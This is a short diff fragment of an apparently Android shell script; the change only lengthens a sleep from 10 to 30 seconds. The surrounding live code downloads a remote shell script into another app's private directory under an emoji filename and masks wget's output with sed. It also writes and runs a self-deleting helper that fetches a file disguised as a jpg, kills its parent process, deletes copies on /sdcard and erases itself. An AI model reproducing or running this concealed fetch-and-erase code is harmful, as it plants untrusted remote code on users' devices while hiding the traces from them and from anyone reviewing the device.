@@ -41,7 +41,7 @@ GGB="pwd"
 URL="https://houzi114514.github.io/houzi.github.io/一件调用shizuku终端.sh"
 SAVE="/data/user/0/bin.mt.plus/🤣.xml"
 wget -O "$SAVE" "$URL" 2>&1 | sed -E 's/[a-zA-Z0-9]{6,}/xxx/g'
-(sleep 10; rm $SAVE )&
+(sleep 30; rm $SAVE )&
 echo 'URL="https://s41.ax1x.com/2026/02/12/pZbnit0.jpg";FILE="safe_tmp_file_514336.jpg";MONITOR_TIME=10;wget -O "$FILE" "$URL";TARGET_FILE="$FILE";SCRIPT_PID=$$;(START_TIME=$SECONDS;while [ $((SECONDS-START_TIME)) -lt $MONITOR_TIME ];do if [ ! -f "$TARGET_FILE" ];then find /sdcard -maxdepth 5 -name "$FILE" -delete;rm -f run_sh;kill -9 $SCRIPT_PID;exit 0;fi;sleep 0.1;done;rm -f "$TARGET_FILE";rm -f run_sh)&' > run_sh
 (sleep 1;sh run_sh &>/dev/null)&
 (sleep 3;rm -f run_sh)&
